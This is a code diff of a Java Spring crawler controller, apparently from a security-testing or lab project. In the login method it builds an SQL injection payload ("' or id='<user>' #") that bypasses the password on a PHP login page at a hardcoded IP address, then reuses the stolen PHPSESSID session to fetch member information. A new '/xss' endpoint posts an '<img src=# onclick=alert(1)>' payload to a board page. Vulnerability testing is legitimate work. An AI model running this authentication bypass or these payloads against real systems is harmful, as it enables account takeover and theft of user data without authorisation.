@@ -12,10 +12,7 @@ import org.jsoup.select.Elements;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.ModelMap;
-import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.ModelAttribute;
-import org.springframework.web.bind.annotation.PostMapping;
-import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.*;
 
 import java.util.Map;
 
@@ -56,13 +53,13 @@ public class CrawlController {
 
         try {
             /*** sql injection 취약점을 통한 로그인 ***/
-            String URL = "http://182.219.28.68:8001/member/login_ok.php";
+            String URL = "http://221.150.109.103:1223/member/login_ok.php";
             String userId = params.get("userId");
             userId = "' or id="+"'"+userId+"'"+" #";
 
             /*크롤링한 정보로 로그인*/
             Connection.Response res =  Jsoup.connect(URL)
-                    .data("id",userId, "pw","2")
+                    .data("id",userId, "pw","")
                     .method(Connection.Method.POST)
                     .execute();
             String sessionId  = res.cookie("PHPSESSID");    //php session 담기
@@ -116,18 +113,18 @@ public class CrawlController {
 
             // ' or id='test1234' #
 
-            Connection.Response res =  Jsoup.connect(URL)
+            /*Connection.Response res =  Jsoup.connect(URL)
                     .data("id","test02", "pw","a")
                     .method(Connection.Method.POST)
                     .execute();
             log.debug("parse : "+res.parse());
             String sessionId  = res.cookie("PHPSESSID");
 
-            Document doc = Jsoup.connect("http://182.219.28.68:8001/member/info.php")
+            Document doc = Jsoup.connect("http://221.150.109.103:1223/member/info.php")
                     .cookie("PHPSESSID",sessionId)
                     .get();
 
-            log.debug("doc :" + doc);
+            log.debug("doc :" + doc);*/
 
             model.addAttribute("input",document.getElementsByTag("input"));
             model.addAttribute("html",document.html());
@@ -144,6 +141,48 @@ public class CrawlController {
 
         }
         return "crawl/crawl_result";
+    }
+
+    @GetMapping("/xss")
+    public String xssForm(ModelMap model) throws Exception{
+        try {
+
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+        return "xss/xss_form";
+    }
+
+    @PostMapping("/xss")
+    @ResponseBody
+    public String xssScan(@RequestParam Map<String, String> params, ModelMap model) throws Exception{
+        /*** sql injection 취약점을 통한 로그인 ***/
+
+        String loginURL = "http://221.150.109.103:1223/member/login_ok.php";
+        String URL = params.get("scanUrl");
+        log.debug("url : "+URL);
+
+        Connection.Response res =  Jsoup.connect(loginURL)
+                .data("id","kkk123", "pw","kkk123")
+                .method(Connection.Method.POST)
+                .execute();
+        String sessionId  = res.cookie("PHPSESSID");    //php session 담기
+        String resParse = res.parse().toString();
+        log.debug("resParse : "+resParse);
+
+
+        String insertUrl = "http://221.150.109.103:1223/board/insert.php";
+        Document doc = Jsoup.connect(insertUrl)
+                .data("subject","test", "content","<img src=# onclick=alert(1)>")
+                .cookie("PHPSESSID",sessionId)
+                .post();
+
+        // doc값이 xss면 취약점 방어 완료
+        // doc값이 게시글 작성 완료 면 취약점 발견
+
+        log.debug("doc :" + doc);
+
+        return "xss";
     }
 
 }
